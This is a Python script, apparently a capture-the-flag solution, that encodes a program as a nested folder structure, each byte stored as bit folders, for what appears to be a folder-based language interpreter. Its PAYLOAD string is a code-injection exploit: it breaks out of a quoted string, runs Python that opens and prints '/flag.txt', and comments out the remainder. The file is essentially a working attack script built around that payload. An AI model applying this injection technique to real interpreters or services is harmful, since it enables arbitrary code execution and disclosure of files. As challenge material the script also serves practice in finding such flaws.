import os
import shutil
from pathlib import Path


PAYLOAD = "\"); f=open('/flag.txt','r'); print(f.readline()); f.close()#"


def create_folders_num(root_path, num):
    for i in range(num):
        Path(f'{root_path}/{i}').mkdir(parents=True, exist_ok=True)


def create_byte(path, bit_string):
    part_a = os.path.join(path, '1upper_hex')
    part_b = os.path.join(path, '2lower_hex')
    Path(part_a).mkdir(parents=True, exist_ok=True)
    Path(part_b).mkdir(parents=True, exist_ok=True)

    for i, bit in enumerate(bit_string[:4]):
        Path(f'{part_a}/{i}').mkdir(parents=True, exist_ok=True)
        if bit == '1':
            Path(f'{part_a}/{i}/bit_set').mkdir(parents=True, exist_ok=True)

    for i, bit in enumerate(bit_string[4:]):
        Path(f'{part_b}/{i}').mkdir(parents=True, exist_ok=True)
        if bit == '1':
            Path(f'{part_b}/{i}/bit_set').mkdir(parents=True, exist_ok=True)


def create_print(root_path):
    command_path = f'{root_path}/print_command'
    print_path = f'{command_path}/1print'
    text_path = f"{command_path}/2text"

    create_folders_num(print_path, 4)

    literal_path = f'{text_path}/1literal'
    create_folders_num(literal_path, 5)

    type_path = f'{text_path}/2type'
    create_folders_num(type_path, 2)

    string_path = f'{text_path}/3string'

    for i, c in enumerate(PAYLOAD.encode('ascii')):
        char_path = os.path.join(string_path, f'char{i}')
        bit_string = bin(c)[2:].zfill(8)
        create_byte(char_path, bit_string)


def main():
    root_path = './flag_print'
    if os.path.exists(root_path) and os.path.isdir(root_path):
        shutil.rmtree(root_path)

    create_print(root_path)


if __name__ == '__main__':
    main()
